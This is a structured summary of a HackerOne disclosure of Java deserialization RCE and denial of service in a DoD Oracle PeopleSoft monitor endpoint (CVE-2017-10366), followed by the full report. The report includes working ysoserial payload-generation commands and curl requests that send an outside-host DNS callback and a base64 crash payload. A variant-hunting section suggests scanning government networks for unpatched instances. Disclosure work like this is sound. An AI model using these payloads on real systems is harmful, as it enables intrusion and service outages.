# Remote Code Execution via Java Object Deserialization in Oracle PeopleSoft Monitor Service (CVE-2017-10366)

## Metadata
- **Source:** HackerOne
- **Report:** 329376 | https://hackerone.com/reports/329376
- **Submitted:** 2018-03-23
- **Reporter:** joaomatosf
- **Program:** U.S. Department of Defense
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Unsafe Java Deserialization, CWE-502: Deserialization of Untrusted Data, Remote Code Execution, Denial of Service
- **CVEs:** CVE-2017-10366
- **Category:** memory-binary

## Summary
The DoD's Oracle PeopleSoft platform exposes a critical remote code execution vulnerability in the /monitor service due to unsafe deserialization of untrusted Java objects without validation. An attacker can send specially crafted serialized Java objects that execute arbitrary code or trigger denial of service attacks when deserialized by the readObject() method. This vulnerability directly impacts CVE-2017-10366 and allows complete system compromise.

## Attack scenario
1. Attacker identifies the DoD PeopleSoft instance running at https://[target]/psc/EXPROD_1/ with exposed /monitor endpoint
2. Attacker uses ysoserial tool to generate malicious serialized Java object payload containing gadget chain (e.g., URLDNS chain)
3. Attacker sends HTTP POST request with binary-serialized payload to vulnerable /monitor/EXPROD_1 endpoint
4. Server deserializes untrusted object via readObject() without type validation or filtering
5. Gadget chain executes during deserialization, triggering DNS lookup or arbitrary code execution
6. Attacker receives DNS query evidence or achieves code execution on DoD system with application privileges

## Root cause
The /monitor service accepts and deserializes untrusted serialized Java objects without implementing any validation, filtering, or type checking. The use of readObject() on untrusted input combined with dangerous gadget chains in the classpath (CommonsCollections, etc.) creates exploitable conditions for deserialization attacks.

## Attacker mindset
Methodical reconnaissance of government infrastructure to identify outdated PeopleSoft instances; leveraging well-known CVEs and publicly available exploitation tools (ysoserial) to achieve RCE or DoS; using DNS exfiltration as proof of concept to demonstrate code execution without immediate destructive impact.

## Defensive takeaways
- Never deserialize untrusted data; implement strict input validation and reject serialized objects from external sources
- Immediately block internet access to /monitor and other administrative endpoints using network-level controls and WAF rules
- Apply security patches for CVE-2017-10366 and upgrade Oracle PeopleSoft to latest patched version
- Implement deserialization filtering using whitelisting of safe classes or JEP 290 filters
- Remove dangerous gadget chain libraries (CommonsCollections, etc.) from classpath where possible or update to patched versions
- Use serialization filtering frameworks and avoid Java serialization protocol for sensitive endpoints
- Implement network segmentation to isolate PeopleSoft instances and restrict access to administrative services
- Monitor for suspicious serialized object patterns and failed deserialization attempts in logs

## Variant hunting
Search for other PeopleSoft endpoints accepting binary POST data (e.g., /psjoa, /psc/login, /psc/icpub)
Test other Oracle products using PeopleSoft framework for identical deserialization patterns
Enumerate government and contractor networks for unpatched PeopleSoft instances via fingerprinting
Develop gadget chains using other common JVM libraries (Spring, Groovy, Rome) present in PeopleSoft deployments
Test for deserialization vulnerabilities in other Java-based DoD systems and platforms
Investigate whether authentication tokens or session data are deserialized unsafely in PeopleSoft

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1203: Exploitation for Client Execution
- T1059: Command and Scripting Interpreter
- T1561: Disk Wipe
- T1499: Endpoint Denial of Service

## Notes
This is a critical vulnerability in US government infrastructure affecting DoD systems. The researcher responsibly disclosed the issue with proof of concept using DNS lookup technique to avoid destructive testing. The vulnerability chains publicly known CVE-2017-10366 with real-world exploitation. The use of ysoserial URLDNS gadget demonstrates the ease of weaponization. DoS variant included OutOfMemoryError payload shows multiple attack vectors from single deserialization weakness. Report emphasizes that library patching alone is insufficient; network-level blocking of dangerous endpoints is essential mitigation.

## Full report
<details><summary>Expand</summary>

SUMMARY:
====================

The DoD **`https://██████/psc/EXPROD_1/`** Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the “monitor” service. Thus an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366 [1].

PROOF OF CONCEPT
====================

For PoC I sent a special serialized java object in order to force the vulnerable server to perform a DNS Lookup for a domain controlled by me (testing1.jexboss.info). In this way, if the code is executed successfully by the DoD server I will receive a DNS query from DoD and see it in the logs of my BIND daemon (the vulnerable DoD server will perform a local DNS query for testing1.jexboss.info and the local DNS will try to query the authoritative nameserver for the jexboss.info domain (ns1.jexboss.info), which is mine).

For more details about this payload used, see [2].

**Attached is a video detailing the PoC.**

**Generating the payload:** for generate the payload I used the tool ysoserial.
```
$ git clone https://github.com/frohoff/ysoserial.git
$ cd ysoserial
$ mvn clean package –DskipTests
$ cd target
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://testing1.jexboss.info > payload
```

**Sending the payload to a vulnerable server:**
```
curl https://█████████/monitor/EXPROD_1 --data-binary @payload -k
```
After sending the payload to the DoD server, the code was successfully executed and I received the DNS query on my BIND server, as can be seen in the log record below.
	
**BIND logs:**
```
23-Mar-2018 18:51:09.183 queries: info: client █████████#53133: query: testing1.jexboss.info IN A -ED (10.0.1.202)
```

**Denial Of Service (DoS)**

This vulnerability also allows denial of service attacks, but I can not perform this test because it puts the availability of your service at risk. If you want to validate this, use the following PoC:

**Generating payload for Denial of Service (DoS)[3]:**
```
echo -n "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3" | base64 -d > payload_dos
```

**Sending:**
```
curl https://███████/monitor/EXPROD_1 --data-binary @payload_dos -k
```
This will make your service stop immediately and show the following error in the logs:
```Exception in thread "Thread-2" java.lang.OutOfMemoryError: Java heap space```

MITIGATION
====================

The best way to mitigate deserialization vulnerabilities is by not deserializing data received from users. In this particular case, any requests from the internet to the path /monitor should be rejected/blocked! 
Also, it is important to note that updating libraries used by attackers as Gadgets (such as commonsCollections) is not enough to protect against deserialization attacks, since new gadgets are discovered and published frequently. So, blocking the monitor service is best suited for this case!

REFERENCES:
====================
[1] - CVE-2017-10366. Link: https://nvd.nist.gov/vuln/detail/CVE-2017-10366
[2] - Triggering a DNS lookup using Java Deserialization. Link: https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
[3] - Java Deserialization DoS – payloads. Link: http://topolik-at-work.blogspot.com.br/2016/04/java-deserialization-dos-payloads.html

Best Regards, 
João Filho Matos Figueiredo, @joaomatosf

## Impact

This vulnerability allows:
1) Remote Code Execution (**RCE**)
2) Denial of Service (DoS)

</details>

---
*Analysed by Claude on 2026-05-12*
